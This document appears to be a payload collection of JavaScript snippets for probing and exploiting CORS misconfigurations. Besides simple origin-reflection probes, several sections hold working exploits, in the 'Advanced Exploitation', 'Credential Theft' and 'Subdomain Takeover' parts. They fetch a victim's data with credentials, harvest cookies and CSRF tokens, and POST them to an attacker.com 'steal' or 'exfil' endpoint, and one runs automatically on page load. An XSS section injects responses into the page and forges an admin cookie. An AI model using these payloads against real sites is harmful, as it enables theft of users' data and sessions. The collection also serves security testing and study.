# Complete CORS (Cross-Origin Resource Sharing) Payloads

This document contains a comprehensive collection of CORS-related payloads for testing and exploiting misconfigurations.

## Table of Contents
1. [Basic CORS Testing Payloads](#basic-cors-testing-payloads)
2. [Origin Reflection Payloads](#origin-reflection-payloads)
3. [Null Origin Payloads](#null-origin-payloads)
4. [Prefix Matching Payloads](#prefix-matching-payloads)
5. [Suffix Matching Payloads](#suffix-matching-payloads)
6. [Subdomain Takeover Payloads](#subdomain-takeover-payloads)
7. [Advanced Exploitation Payloads](#advanced-exploitation-payloads)
8. [Pre-flight Request Payloads](#pre-flight-request-payloads)
9. [Credential Theft Payloads](#credential-theft-payloads)
10. [XSS Combined Payloads](#xss-combined-payloads)

---

## Basic CORS Testing Payloads

```javascript
// Simple CORS test
fetch('https://target.com/api/data', {
  method: 'GET',
  headers: {
    'Origin': 'https://attacker.com'
  },
  credentials: 'include'
})
.then(response => response.json())
.then(data => console.log(data))
.catch(error => console.error('Error:', error));
```

```javascript
// Test with different HTTP methods
fetch('https://target.com/api/data', {
  method: 'POST',
  headers: {
    'Origin': 'https://attacker.com',
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({test: 'data'}),
  credentials: 'include'
});
```

---

## Origin Reflection Payloads

```javascript
// Test for reflected Origin header
fetch('https://target.com/api/data', {
  headers: {
    'Origin': 'https://target.com.evil.com'
  }
})
.then(response => {
  console.log('Access-Control-Allow-Origin:', response.headers.get('Access-Control-Allow-Origin'));
});
```

```javascript
// Test with malformed Origin
fetch('https://target.com/api/data', {
  headers: {
    'Origin': 'target.com.attacker.com'
  }
});
```

---

## Null Origin Payloads

```javascript
// Test with null Origin
var iframe = document.createElement('iframe');
iframe.src = 'data:text/html,<script>fetch("https://target.com/api/data", {headers:{"Origin":"null"},credentials:"include"}).then(r=>r.text()).then(d=>parent.postMessage(d,"*"))</script>';
document.body.appendChild(iframe);

window.addEventListener('message', function(e) {
  console.log('Received data:', e.data);
});
```

---

## Prefix Matching Payloads

```javascript
// Test for domain prefix vulnerabilities
const domains = [
  'https://target.com.attacker.com',
  'https://attacker-target.com',
  'https://target.com.attacker.com',
  'https://targetattacker.com'
];

domains.forEach(domain => {
  fetch('https://target.com/api/data', {
    headers: {
      'Origin': domain
    }
  })
  .then(response => {
    console.log(`Testing ${domain}:`, response.headers.get('Access-Control-Allow-Origin'));
  });
});
```

---

## Suffix Matching Payloads

```javascript
// Test for domain suffix vulnerabilities
const suffixes = [
  'https://attacker.com.target.com',
  'https://attacker.target.com',
  'https://target-com.attacker.com'
];

suffixes.forEach(domain => {
  fetch('https://target.com/api/data', {
    headers: {
      'Origin': domain
    }
  })
  .then(response => {
    console.log(`Testing ${domain}:`, response.headers.get('Access-Control-Allow-Origin'));
  });
});
```

---

## Subdomain Takeover Payloads

```javascript
// If a subdomain is vulnerable to takeover
fetch('https://target.com/api/data', {
  headers: {
    'Origin': 'https://vulnerable-subdomain.target.com'
  },
  credentials: 'include'
})
.then(response => response.json())
.then(data => {
  // Send data to attacker server
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
});
```

---

## Advanced Exploitation Payloads

```javascript
// Full exploitation example
const exploit = () => {
  fetch('https://target.com/api/sensitive-data', {
    method: 'GET',
    headers: {
      'Origin': 'https://attacker.com'
    },
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    // Exfiltrate data
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  })
  .catch(error => console.error('Error:', error));
};

// Run the exploit when victim visits the page
window.onload = exploit;
```

---

## Pre-flight Request Payloads

```javascript
// Test OPTIONS request
fetch('https://target.com/api/data', {
  method: 'OPTIONS',
  headers: {
    'Origin': 'https://attacker.com',
    'Access-Control-Request-Method': 'PUT',
    'Access-Control-Request-Headers': 'X-Custom-Header'
  }
})
.then(response => {
  console.log('Allowed Methods:', response.headers.get('Access-Control-Allow-Methods'));
  console.log('Allowed Headers:', response.headers.get('Access-Control-Allow-Headers'));
});
```

---

## Credential Theft Payloads

```javascript
// Steal cookies and sensitive data
fetch('https://target.com/account', {
  credentials: 'include',
  headers: {
    'Origin': 'https://attacker.com'
  }
})
.then(response => response.text())
.then(html => {
  // Parse HTML and extract sensitive data
  const doc = new DOMParser().parseFromString(html, 'text/html');
  const userData = {
    cookies: document.cookie,
    csrfToken: doc.querySelector('meta[name="csrf-token"]')?.content,
    accountInfo: doc.querySelector('.account-info')?.innerText
  };
  
  // Exfiltrate data
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify(userData)
  });
});
```

---

## XSS Combined Payloads

```javascript
// Combine CORS with XSS
fetch('https://target.com/vulnerable-endpoint', {
  headers: {
    'Origin': 'https://attacker.com',
    'X-XSS-Protection': '0'
  }
})
.then(response => response.text())
.then(data => {
  // If response is reflected without proper encoding
  document.getElementById('injection-point').innerHTML = data;
  
  // Now that we have XSS, we can do more damage
  document.cookie = 'admin=true; path=/; domain=target.com';
});
```

---

## Mitigation Bypass Payloads

```javascript
// Bypass regex-based origin validation
const bypassAttempts = [
  'https://target.com.attacker.com',
  'https://target.com%60.attacker.com',
  'https://target.com\\attacker.com',
  'https://target.com/.attacker.com',
  'https://target.com@attacker.com'
];

bypassAttempts.forEach(origin => {
  fetch('https://target.com/api/data', {
    headers: {
      'Origin': origin
    }
  })
  .then(response => {
    console.log(`Bypass attempt ${origin}:`, 
      response.headers.get('Access-Control-Allow-Origin'));
  });
});
```

